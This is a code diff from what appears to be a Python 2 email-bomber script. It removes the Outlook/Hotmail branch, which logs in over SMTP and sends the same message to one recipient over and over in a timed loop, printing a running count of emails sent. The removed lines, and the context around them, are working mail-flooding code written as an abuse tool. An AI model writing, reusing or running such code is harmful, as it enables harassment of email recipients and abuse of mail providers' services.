@@ -91,34 +91,7 @@ elif server == '2' or server == 'Yahoo' or server == 'yahoo':
 			print "Failed to Send"
 	server.close()
 	
-#Hotmail/Outlook
-elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
-	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
-	bomb()
-	server.ehlo()
-	server.starttls()
-	try:
-		server.login(user, pwd)
-	except smtplib.SMTPAuthenticationError:
-		print bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
-		sys.exit()
-	while no != nomes:
-		try:
-			server.sendmail(user, to, message)
-			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
-			no += 1
-			time.sleep(.8)
-		except KeyboardInterrupt:
-			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
-			sys.exit()
-		except smtplib.SMTPAuthenticationError:
-			print '\nThe username or password you entered is incorrect.'
-			sys.exit()
-		except:
-			print "Failed to Send "
-	server.close()
-	
 else:
-	print 'Works only with Gmail, Yahoo, Outlook and Hotmail.'
+	print 'Works only with Gmail, Yahoo ...'
 	sys.exit()
 
